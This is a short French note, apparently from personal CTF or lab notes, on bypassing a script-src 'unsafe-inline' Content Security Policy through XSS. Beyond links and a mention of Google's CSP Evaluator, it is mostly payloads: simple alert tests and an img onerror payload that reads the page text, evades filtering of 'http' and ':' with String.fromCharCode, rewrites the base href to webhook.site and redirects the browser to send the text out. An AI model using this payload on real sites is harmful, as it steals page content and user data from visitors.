
https://www.hahwul.com/2019/01/27/csp-bypass-technique-xss/
https://www.youtube.com/watch?v=jemIwQH6Ifs


![[Pasted image 20231214190027.png]]

# Site de test CSP en ligne
https://csp-evaluator.withgoogle.com/
Google fournit une page Web de diagnostic (?) CSP appelée CSP Evaluator, et si vous la testez, elle vous informera des éléments CSP manquants. Il est normal de l'utiliser comme valeur de référence.
# Bypass script-src unsafe-inline
```
<Svg OnLoad=alert(domain)>
```
```
<img src="" onerror="alert(1)">
```
On peut modifier le domaine de base du site web par celui d'un serveur d'écoute pour recevoir les requêtes en écrivant du code js dans l'attribut *onerror*
```
// flag location in document
var flag=document.querySelector("body > div > div > p").innerText;
// bypass http and ':' filtering
document.write("<base href=\"http+String.fromCharCode(58)+"//webhook.site"+"\" />");
// redirect to webhook.site
document.location="229885cb-f49d-41fc-b954-2e2c56a2248c?test="+flag;
```
ce qui donne le payload
```
<img src='#' onerror='var flag=document.querySelector("body").innerText;document.write("<base href=\"ht"+"tp"+String.fromCharCode(58)+"//webhook.site"+"\" />");document.location="dc09032a-d28b-47f5-9297-8ea08e0c945e?test="+flag;'>
```



